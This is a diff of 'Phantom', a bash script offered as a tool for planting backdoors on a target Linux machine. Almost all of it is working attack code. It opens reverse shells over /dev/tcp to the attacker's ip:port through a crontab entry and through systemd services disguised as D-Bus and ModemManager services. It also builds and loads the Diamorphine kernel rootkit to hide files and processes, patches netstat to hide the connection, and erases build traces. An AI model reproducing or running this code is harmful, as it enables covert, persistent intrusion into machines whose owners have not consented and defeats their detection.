@@ -1,7 +1,9 @@
 #!/bin/bash
 
-: 'Phantom is a tool which creates backdoor shells from a target machine to a predifined ip:port (your machine) and 
+: 'Phantom is a tool which creates backdoor shells from a target machine to a predifined ip:port (your machine) and
 hides their pid, persisting through reboots. It also hides the files needed to perform the above and replaces netstat.
+
+***Phantom was created for educational purposes. Stay away from illegal activities.***
 
 Copyright © 2018 Konstantinos Sarantopoulos
 
@@ -50,17 +52,17 @@ ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 '
 
-ip="127.0.0.1/9999" #change this according to the listening ip and port 
-#change also the ip and port in the _hiding variable (use search and AAA to find it in the document) 
+ip="127.0.0.1/9999" #change this according to the listening ip and port
+#change also the ip and port in the _hiding variable (use search and AAA to find it in the document)
 #and the ip:port that netstat is gonna hide (use search and QQQ to find it in the document)
 
-#that's the makefile for the usb-bus rootkit module
-makefile=$(cat << \EOF
+#the makefile for the usb-bus rootkit module
+diamorphine_makefile=$(cat << \EOF
 obj-m := usb-bus.o
 KERNEL_DIR = /lib/modules/$(shell uname -r)/build
 PWD = $(shell pwd)
 all:
-	make -C $(KERNEL_DIR) SUBDIRS=$(PWD) modules 
+	make -C $(KERNEL_DIR) SUBDIRS=$(PWD) modules
 EOF
 )
 
@@ -71,7 +73,7 @@ diamorphine=$(cat << \EOF
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
 #include <linux/slab.h>
-#include <linux/version.h> 
+#include <linux/version.h>
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
 	#include <asm/uaccess.h>
 #endif
@@ -98,7 +100,7 @@ struct linux_dirent {
 char* MAGIC_PREFIX[4] = {"d-bus", "dbus-org.freedesktop.Modem.service", "usb-bus", "dbus-org.freedesktop.ModemManager11.service"};
 int indexes = sizeof(MAGIC_PREFIX)/sizeof(MAGIC_PREFIX[0]);
 
-#define PF_INVISIBLE 0x10000000	
+#define PF_INVISIBLE 0x10000000
 
 #define MODULE_NAME "diamorphine"
 
@@ -165,7 +167,7 @@ asmlinkage int
 hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 	unsigned int count)
 {
-	int ret = orig_getdents64(fd, dirent, count), err; 
+	int ret = orig_getdents64(fd, dirent, count), err;
 	unsigned short proc = 0;
 	unsigned long off = 0;
 	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
@@ -230,7 +232,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 	struct inode *d_inode;
 
 	if (ret <= 0)
-		return ret;	
+		return ret;
 
 	kdirent = kzalloc(ret, GFP_KERNEL);
 	if (kdirent == NULL)
@@ -253,7 +255,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 	while (off < ret) {
 		dir = (void *)kdirent + off;
 		for (i = 0; i < indexes; i++) {
-		if ((!proc && 
+		if ((!proc &&
 		(memcmp(MAGIC_PREFIX[i], dir->d_name, strlen(MAGIC_PREFIX[i])) == 0))
 		|| (proc &&
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
@@ -427,7 +429,7 @@ EOF
 )
 
 #that's the script that is gonna insert the usb-bus rootkit module at boot, hide the systemd services and the bash processes
-_hiding=$(cat << \EOF
+hiding_script=$(cat << \EOF
 #!/bin/bash
 
 insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko
@@ -436,22 +438,22 @@ hidden_pids=()
 
 while true; do
 
-#hide /bin/bash/bin/usb-bus and /bin/bash/sbin/usb-bus, which are our systemd services
-bash_pid=$(ps aux | awk '{ if($11 ~ /bash/) print $2 }') 
+#hide usb-bus and d-bus, which are the scripts that the systemd services execute
+bash_pid=$(ps aux | awk '{ if($11 ~ /bash/) print $2 }')
 while read hide_pid; do
 	cmdline=$(cat /proc/$hide_pid/cmdline)
 	cat /proc/$hide_pid/cmdline &>/dev/null
 	if [ "$?" == "1" ]; then
 		continue
 	fi
-	if [ "$cmdline" == "/bin/bash/usb-bus" ] || [ "$cmdline" == "/bin/bash/home/d-bus" ]; then
+	if [ "$cmdline" == "/bin/bash/var/lib/usb-bus/usb-bus" ] || [ "$cmdline" == "/bin/bash/usr/local/share/d-bus/d-bus" ]; then
 		kill -31 $hide_pid
 		#echo "hid systemd service pid: $hide_pid"
 	fi
 done <<<$bash_pid
 
 #hide bash shells which our systemd service spawns
-inode_list=$(cat /proc/net/tcp | awk '{ if($3 ~ /0100007F:270F/) print $10 }') #(AAA) change 0100007F:270F according to the listening ip and port (use ip to hex converter from the internet, revert the 
+inode_list=$(cat /proc/net/tcp | awk '{ if($3 ~ /0100007F:270F/) print $10 }') #(AAA) change 0100007F:270F according to the listening ip and port (use ip to hex converter from the internet, revert the
 #resulting hex and use it (without the 0x) in place of 0100007F, then convert the port from decimal to hex and use it in place of 270F)
 for (( i=1; i <= 65553; i=i+1 )); do
 	if [ "${hidden_pids[i]}" != "" ]; then
@@ -477,27 +479,27 @@ EOF
 )
 
 #that's the script that's gonna open the bash connections
-_bash=$(cat << EOF 
+bash_script=$(cat << EOF
 #!/bin/bash
 
 while true; do
 
-bash &>/dev/tcp/$ip 0>&1 & 
-sleep 60
+bash &>/dev/tcp/$ip 0>&1 &
+sleep 300
 
 done
 EOF
 )
 
-#that's the code for the systemd service that's gonna do the hiding
-_hiding_systemd=$(cat << \EOF 
+#that's the systemd service that's gonna do the hiding
+hiding_service=$(cat << \EOF
 [Unit]
 After=network.target
 StartLimitIntervalSec=0
 
 [Service]
 Type=simple
-ExecStart=/usb-bus
+ExecStart=/var/lib/usb-bus/usb-bus
 Restart=always
 User=root
 
@@ -506,15 +508,15 @@ WantedBy=multi-user.target
 EOF
 )
 
-#that's the code for the systemd service that's gonna open the bash connections
-_bash_systemd=$(cat << \EOF 
+#that's the systemd service that's gonna open the bash connections
+bash_service=$(cat << \EOF
 [Unit]
 After=network.target
 StartLimitIntervalSec=0
 
 [Service]
 Type=simple
-ExecStart=/home/d-bus
+ExecStart=/usr/local/share/d-bus/d-bus
 Restart=always
 User=root
 
@@ -523,7 +525,7 @@ WantedBy=multi-user.target
 EOF
 )
 
-mkfile=$(cat << \EOF	
+kernel_makefile=$(cat << \EOF
 diff --git a/Makefile b/Makefile
 index dda982c..f96b174 100644
 --- a/Makefile
@@ -531,7 +533,7 @@ index dda982c..f96b174 100644
 @@ -608,6 +608,12 @@ endif # $(dot-config)
  # Defaults to vmlinux, but the arch makefile usually adds further targets
  all: vmlinux
- 
+
 +# force no-pie for distro compilers that enable pie by default
 +KBUILD_CFLAGS += $(call cc-option, -fno-pie)
 +KBUILD_CFLAGS += $(call cc-option, -no-pie)
@@ -542,9 +544,9 @@ index dda982c..f96b174 100644
  # values of the respective KBUILD_* variables
  ARCH_CPPFLAGS :=
 EOF
-)	
+)
 
-netpatch=$(cat << \EOF
+net_tools_patch=$(cat << \EOF
 diff --git a/iptunnel.c b/iptunnel.c
 index 4943d83..acfcbc7 100644
 --- a/iptunnel.c
@@ -563,24 +565,29 @@ index 4943d83..acfcbc7 100644
  #include <linux/types.h>
 +#include <linux/ip.h>
  #include <linux/if_tunnel.h>
- 
+
  #include "config.h"
 EOF
 )
 
+#---start phantom---
+echo "---Phantom started---"
 #print the user making the connection
 echo "user making the connection: $USER"
-
-#if the user making the connection is not root add a crontab entry which spawns backdoor bash shells	
+#if the user making the connection is not root add a crontab entry which spawns backdoor bash shells
 if [ "$USER" != "root" ]; then
+  printf "adding crontab for $USER... "
 	printf "* * * * * bash -c 'bash &>/dev/tcp/$ip 0>&1 &'\n" > /tmp/.cron
 	crontab /tmp/.cron
-	echo "added crontab for $USER"
+  if [ "$?" == "0" ]; then
+    echo "done"
+  else
+    echo "failed"
+  fi
 	rm /tmp/.cron
 	#exit to tell ncat that we are done with the script so the connection closes
 	exit
 fi
-
 #if the user making the connection is root do the following:
 if [ "$USER" == "root" ]; then
 	#users=$(cat /etc/passwd | awk -F: '{ print $1 }')
@@ -593,99 +600,92 @@ if [ "$USER" == "root" ]; then
 	#	fi
 	#done
 
-	#---create the systemd services---
-	#create the files that the systemd services are gonna use
-	printf "$_hiding" >/usb-bus
-	chmod 777 /usb-bus
-	printf "$_bash" >/home/d-bus
-	chmod 777 /home/d-bus	
-	#create a systemd service to execute the _hiding script
-	systemctl stop dbus-org.freedesktop.Modem.service &>/dev/null
-	systemctl disable dbus-org.freedesktop.Modem.service &>/dev/null
-	printf "$_hiding_systemd" >/etc/systemd/system/dbus-org.freedesktop.Modem.service
-	systemctl daemon-reload &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "daemon-reload successful"
-	else
-		echo "daemon-reload unsuccessful"
-	fi
-	systemctl enable dbus-org.freedesktop.Modem &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "dbus-org.freedesktop.Modem.service-bus enabled"
-	else
-		echo "dbus-org.freedesktop.Modem.service-bus not enabled"
-	fi
-	systemctl restart dbus-org.freedesktop.Modem &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "dbus-org.freedesktop.Modem.service-bus started"
-	else
-		echo "dbus-org.freedesktop.Modem.service-bus not started"
-	fi
-	#create a systemd service to execute the _bash script
-	systemctl stop dbus-org.freedesktop.ModemManager11 &>/dev/null
-	systemctl disable dbus-org.freedesktop.ModemManager11 &>/dev/null
-	printf "$_bash_systemd" >/etc/systemd/system/dbus-org.freedesktop.ModemManager11.service
-	systemctl daemon-reload &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "daemon-reload successful"
-	else
-		echo "daemon-reload unsuccessful"
-	fi
-	systemctl enable dbus-org.freedesktop.ModemManager11 &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "dbus-org.freedesktop.ModemManager11.service-bus enabled"
-	else
-		echo "dbus-org.freedesktop.ModemManager11.service-bus not enabled"
-	fi
-	systemctl restart dbus-org.freedesktop.ModemManager11 &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "dbus-org.freedesktop.ModemManager11.service-bus started"
-	else
-		echo "dbus-org.freedesktop.ModemManager11.service-bus not started"
-	fi
-	
+	#---create the systemd scripts and services---
+	#create the script that the systemd service is gonna use
+  create_script () {
+    printf "creating the $2 script... "
+  	printf "$1" >$2
+  	chmod 777 $2
+    if [ "$?" == "0" ]; then
+  		echo "done"
+  	else
+  		echo "failed"
+  	fi
+  }
+	#create the systemd service
+  create_service () {
+  	printf "$1" >/etc/systemd/system/$2
+    printf "enabling $2... "
+  	systemctl enable $2 &>/dev/null
+  	if [ "$?" == "0" ]; then
+  		echo "done"
+  	else
+  		echo "failed"
+  	fi
+    printf "starting $2... "
+  	systemctl restart $2 &>/dev/null
+  	if [ "$?" == "0" ]; then
+  		echo "done"
+  	else
+  		echo "failed"
+  	fi
+  }
+  echo "---create the systemd scripts and services---"
+  mkdir /var/lib/usb-bus 2>/dev/null
+  create_script "$hiding_script" "/var/lib/usb-bus/usb-bus"
+  mkdir /usr/local/share/d-bus 2>/dev/null
+  create_script "$bash_script" "/usr/local/share/d-bus/d-bus"
+  create_service "$hiding_service" "bus-org.freedesktop.Modem.service"
+  create_service "$bash_service" "bus-org.freedesktop.ModemManager11.service"
+
+  #---install prerequisites---
+  install_pre () {
+    which $1 &>/dev/null
+    if [ "$?" != "0" ]; then
+      printf "install $1... "
+      $2=$1
+      apt-get install -y $1 &>/dev/null
+      if [ "$?" == "0" ]; then
+        echo "done"
+      else
+        dnf install -y $1 &>/dev/null
+        if [ "$?" == "0" ]; then
+          echo "done"
+        else
+          echo "failed"
+        fi
+      fi
+    fi
+  }
+  echo "---install prerequisites---"
+  install_pre "make" "ma"
+  install_pre "gcc" "gc"
+  install_pre "wget" "wg"
+  install_pre "yes" "ye"
+  install_pre "unzip" "un"
+  install_pre "patch" "pa"
+  install_pre "kmod" "km"
+
 	#---make and insert the usb-bus rootkit module---
-	#check if make and gcc are installed, otherwise install them
-	ls /usr/bin/make &>/dev/null
-	if [ "$?" != "0" ]; then
-		m="make"
-		echo "installing make..."
-		apt-get install make -y &>/dev/null
-		if [ "$?" == "0" ]; then
-			echo "make installed successfully"
-		else
-			echo "make din't install"
-		fi
-	fi
-	ls /usr/bin/gcc &>/dev/null
-	if [ "$?" != "0" ]; then
-		g="gcc"
-		echo "installing gcc..."
-		apt-get install gcc -y &>/dev/null
-		if [ "$?" == "0" ]; then
-			echo "gcc installed successfully"
-		else
-			echo "gcc didn't install"
-		fi
-	fi
+  echo "---install the rootkit---"
 	#make the usb-bus rootkit module
 	if [ ! -d "/lib/modules/$(uname -r)/kernel/drivers/usb-bus" ]; then
 		mkdir /lib/modules/$(uname -r)/kernel/drivers/usb-bus
 	fi
-	printf "$makefile" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile
+	printf "$diamorphine_makefile" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile
 	printf "$diamorphine" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.c
-	echo "making usb-bus rootkit module..."
+	printf "make usb-bus rootkit module... "
 	make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
-	#if make is unsuccessful patch the Makefile, get the headers needed for the module to work and make again
 	if [ "$?" == "0" ]; then
-		echo "make usb-bus rootkit module successful"
+		echo "done"
 	else
-		echo "make usb-bus rootkit module unsuccessful, patching Makefile and getting headers..."
+    echo "failed, trying some fixes"
+    #if make is unsuccessful get the headers needed for the module to work, patch the kernel makefile and make again
 		#copy the headers
 		if [ ! -d "/usr/src/linux-headers-$(uname -r)/include/asm" ] || [ ! -L "/usr/src/linux-headers-$(uname -r)/include/asm" ]; then
 			cp -r -L /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include
 			if [ "$?" == "1" ]; then
-				cp -r /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include 
+				cp -r /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include
 			fi
 		fi
 		if [ ! -d "/usr/src/linux-headers-$(uname -r)/include/uapi/asm" ]; then
@@ -704,211 +704,143 @@ if [ "$USER" == "root" ]; then
 				fi
 			fi
 		fi
-		#check if patch is installed, otherwise install it and patch the Makefile
-		ls /usr/bin/patch &>/dev/null
-		if [ "$?" != "0" ]; then
-			p="patch"
-		echo "installing patch..."
-		apt-get install patch -y &>/dev/null
-		if [ "$?" == "0" ]; then
-			echo "patch installed successfully"
-		else
-			echo "patch din't install"
-		fi
-		fi
+    #patch the kernel makefile
 		location1=$(readlink -m /usr/src/linux-headers-$(uname -r)/Makefile)
-		location=$(echo "$location1" | awk -F/ '{ print $2"/"$3"/"$4 }')		
-		printf "$mkfile" >/$location/mkfile.patch
+		location=$(echo "$location1" | awk -F/ '{ print $2"/"$3"/"$4 }')
+		printf "$kernel_makefile" >/$location/mkfile.patch
+    printf "patch the makefile... "
 		patch -b -d /$location </$location/mkfile.patch &>/dev/null
 		if [ "$?" == "0" ]; then
-			echo "patch source Makefile successful"
+			echo "done"
 		else
-			echo "patch source Makefile unsuccessful"
+			echo "failed"
 		fi
 		rm /$location/mkfile.patch
-		#make usb-bus rootkit module again
-		echo "making usb-bus rootkit module again..."
+    #make the usb-bus module
+		printf "make the usb-bus rootkit module... "
 		make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
 		if [ "$?" == "0" ]; then
-			echo "make usb-bus rootkit module successful"
+			echo "done"
 		else
-			echo "make usb-bus rootkit module unsuccessful"
+			echo "failed"
 		fi
 		rm /$location/Makefile
 		mv /$location/Makefile.* /$location/Makefile
 	fi
+
 	#make module auto-load after every reboot (dangerous, the computer might start having problems at boot)
 	#printf "usb-bus" >/usr/lib/modules-load.d/usb-bus.conf
 	#depmod -a #take care of dependencies otherwise you will have problems booting
-	#remove the dirt
+
+	#remove what is not needed after the make
 	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.c &>/dev/null
 	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.o &>/dev/null
 	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile &>/dev/null
 	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Module* &>/dev/null
 	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/modules* &>/dev/null
 	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*safe &>/dev/null
-	#check if insmod is installed. otherwise intall it and insert usb-bus rootkit module
-	ls /bin/kmod &>/dev/null
-	if [ "$?" != "0" ]; then
-		echo "installing kmod..."
-		apt-get install kmod -y &>/dev/null
-		if [ "$?" == "0" ]; then
-			echo "kmod installed successfully"
-		else
-			echo "kmod din't install"
-		fi
-	fi
+  #insert the usb-bus module
+  printf "inserting the usb-bus module... "
 	insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko &>/dev/null
 	if [ "$?" == "0" ]; then
-		echo "usb-bus rootkit module inserted"
+		echo "done"
 	else
-		echo "usb-bus rootkit module not inserted"
+		echo "failed"
 	fi
 
 	#---replace netstat---
-	rm /tmp/net-tools.zip &>/dev/null
-	rm  -r /tmp/net-tools-master &>/dev/null
-	#check if wget is installed, otherwise intall it and download net-tools.zip
-	ls /usr/bin/wget &>/dev/null
-	if [ "$?" != "0" ]; then
-		w="wget"
-		echo "installing wget..."
-		apt-get install wget -y &>/dev/null
-		if [ "$?" == "0" ]; then
-			echo "wget installed successfully"
-		else
-			echo "wget din't install"
-		fi
-	fi
-	echo "downloading net-tools.zip..."
-	wget -O /tmp/net-tools.zip https://github.com/ecki/net-tools/archive/master.zip &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "downloaded net-tools.zip"
-	else
-		echo "failed to download net-tools.zip"
-	fi
-	if [ "$w" == "wget" ]; then
-		echo "removing wget..."
-		apt-get purge wget -y &>/dev/null
-		if [ "$?" == "0" ]; then
-			echo "wget removed"
-		else
-			echo "wget not removed"
-		fi
-	fi
-	#check if unzip is installed, otherwise intall it and unzip net-tools.zip
-	ls /usr/bin/unzip &>/dev/null
-	if [ "$?" != "0" ]; then
-		z="unzip"
-		echo "installing unzip..."
-		apt-get install unzip -y &>/dev/null
-		if [ "$?" == "0" ]; then
-			echo "unzip installed successfully"
-		else
-			echo "unzip din't install"
-		fi
-	fi
-	unzip -d /tmp /tmp/net-tools.zip >/dev/null
-	if [ "$?" == "0" ]; then
-		echo "unzipped net-tools.zip"
-	else
-		echo "failed to unzip net-tools.zip"
-	fi
-	rm /tmp/net-tools.zip
-	if [ "$z" == "unzip" ]; then
-		echo "removing unzip..."
-		apt-get purge unzip -y &>/dev/null
-		if [ "$?" == "0" ]; then
-			echo "unzip removed"
-		else
-			echo "unzip not removed"
-		fi
-	fi
- 	#replace netstat.c (change ip:port in the first sed command) QQQ
-	sed -i 's/printf("%-4s\s\s%6ld\s%6ld\s%-\*s/if ( strstr(rem_addr, "127.0.0.1:9999") == 0 ) {\n\t\tprintf("%-4s  %6ld %6ld %-*s/' /tmp/net-tools-master/netstat.c
-	sed -i '0,/finish_this_one(uid,inode,timers);/{s/finish_this_one(uid,inode,timers);/\tfinish_this_one(uid,inode,timers);\n\t}/};' /tmp/net-tools-master/netstat.c
-	if [ "$?" == "0" ]; then
-		echo "netstat.c replaced"
-	else
-		echo "netstat.c not replaced"
-	fi
-	#patch the net-tools Makefile
-	printf "$netpatch" >/tmp/net-tools-master/net.patch
-	patch -d /tmp/net-tools-master/ </tmp/net-tools-master/net.patch &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "patch net-tools successful"
-	else
-		echo "patch net-tools unsuccessful"
-	fi
-	if [ "$p" == "patch" ]; then
-		echo "removing patch..."
-		apt-get purge patch -y &>/dev/null
-		if [ "$?" == "0" ]; then
-			echo "patch removed"
-		else
-			echo "patch not removed"
-		fi
-	fi
-	#make update net-tools-master so netstat gets replaced
-	ls /usr/bin/yes &>/dev/null
-	if [ "$?" != "0" ]; then
-		y="yes"
-		echo "installing yes..."
-		apt-get install yes -y &>/dev/null
-		if [ "$?" == "0" ]; then
-			echo "yes installed successfully"
-		else
-			echo "yes din't install"
-		fi
-	fi
-	yes "" 2>/dev/null | make -C /tmp/net-tools-master config &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "make config net-tools successful"
-	else
-		echo "make  config net-tools unsuccessful"
-	fi
-	if [ "$y" == "yes" ]; then
-		echo "removing yes..."
-		apt-get purge yes -y &>/dev/null
-		if [ "$?" == "0" ]; then
-			echo "yes removed"
-		else
-			echo "yes not removed"
-		fi
-	fi
-	make -C /tmp/net-tools-master &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "make net-tools-master successful"
-	else
-		echo "make net-tools-master unsuccessful"
-	fi
-	make update -C /tmp/net-tools-master &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "netstat replaced"
-	else
-		echo "netstat not replaced"
-	fi
-	rm  -r /tmp/net-tools-master
+  which netstat &>/dev/null
+  if [ "$?" == "0" ]; then
+    echo "---replace netstat---"
+  	rm /tmp/net-tools.zip &>/dev/null
+  	rm  -r /tmp/net-tools-master &>/dev/null
+    #download net-tools.zip
+  	printf "download net-tools.zip... "
+  	wget -O /tmp/net-tools.zip https://github.com/ecki/net-tools/archive/master.zip &>/dev/null
+  	if [ "$?" == "0" ]; then
+  		echo "done"
+  	else
+  		echo "failed"
+  	fi
+    #unzip net-tools.zip
+    printf "unzipping net-tools.zip... "
+  	unzip -d /tmp /tmp/net-tools.zip >/dev/null
+  	if [ "$?" == "0" ]; then
+  		echo "done"
+  	else
+  		echo "failed"
+  	fi
+  	rm /tmp/net-tools.zip
+   	#modify netstat.c (change ip:port in the first sed command) (QQQ)
+    printf "modifying netstat.c... "
+  	sed -i 's/printf("%-4s\s\s%6ld\s%6ld\s%-\*s/if ( strstr(rem_addr, "127.0.0.1:9999") == 0 ) {\n\t\tprintf("%-4s  %6ld %6ld %-*s/' /tmp/net-tools-master/netstat.c
+  	sed -i '0,/finish_this_one(uid,inode,timers);/{s/finish_this_one(uid,inode,timers);/\tfinish_this_one(uid,inode,timers);\n\t}/};' /tmp/net-tools-master/netstat.c
+  	if [ "$?" == "0" ]; then
+  		echo "done"
+  	else
+  		echo "failed"
+  	fi
+    #patch the makefile
+    printf "patching the net-tools makefile... "
+  	printf "$net_tools_patch" >/tmp/net-tools-master/net.patch
+  	patch -d /tmp/net-tools-master/ </tmp/net-tools-master/net.patch &>/dev/null
+  	if [ "$?" == "0" ]; then
+  		echo "done"
+  	else
+  		echo "failed"
+  	fi
+    #make config net-tools-master
+    printf "make config net-tools-master... "
+  	yes "" 2>/dev/null | make -C /tmp/net-tools-master config &>/dev/null
+  	if [ "$?" == "0" ]; then
+  		echo "done"
+  	else
+  		echo "failed"
+  	fi
+    #make net-tools-master
+    printf "make net-tools-master... "
+  	make -C /tmp/net-tools-master &>/dev/null
+  	if [ "$?" == "0" ]; then
+  		echo "done"
+  	else
+  		echo "failed"
+  	fi
+    #make update net-tools-master, so netstat gets replaced
+    printf "make update net-tools-master... "
+  	make update -C /tmp/net-tools-master &>/dev/null
+  	if [ "$?" == "0" ]; then
+  		echo "done, netstat replaced"
+  	else
+  		echo "failed, netstat not replaced"
+  	fi
+  	rm  -r /tmp/net-tools-master
+  fi
 
-	#remove make and gcc if they weren't installed
-	if [ "$m" == "make" ]; then
-		echo "removing make..."
-		apt-get purge make -y &>/dev/null
-		if [ "$?" == "0" ]; then
-			echo "make removed"
-		else
-			echo "make not removed"
-		fi
-	fi
-	if [ "$g" == "gcc" ]; then
-		echo "removing gcc..."
-		apt-get purge gcc -y &>/dev/null
-		if [ "$?" == "0" ]; then
-			echo "gcc removed"
-		else
-			echo "gcc not removed"
-		fi
-	fi
+	#---remove prerequisites---
+  remove_pre () {
+    if [ "$1" == "$2" ]; then
+      printf "removing $2... "
+      apt-get purge -y $2 &>/dev/null
+      if [ "$?" == "0" ]; then
+        echo "done"
+      else
+        dnf remove -y $2 &>/dev/null
+        if [ "$?" == "0" ]; then
+          echo "done"
+        else
+          echo "failed"
+        fi
+      fi
+    fi
+  }
+  echo "---remove prerequisites---"
+  remove_pre "$ma" "make"
+  remove_pre "$gc" "gcc"
+  remove_pre "$ye" "yes"
+  remove_pre "$wg" "wget"
+  remove_pre "$un" "unzip"
+  remove_pre "$pa" "patch"
+  remove_pre "$km" "kmod"
 
 	#exit to tell ncat that we are done with the script so the connection closes
 	exit
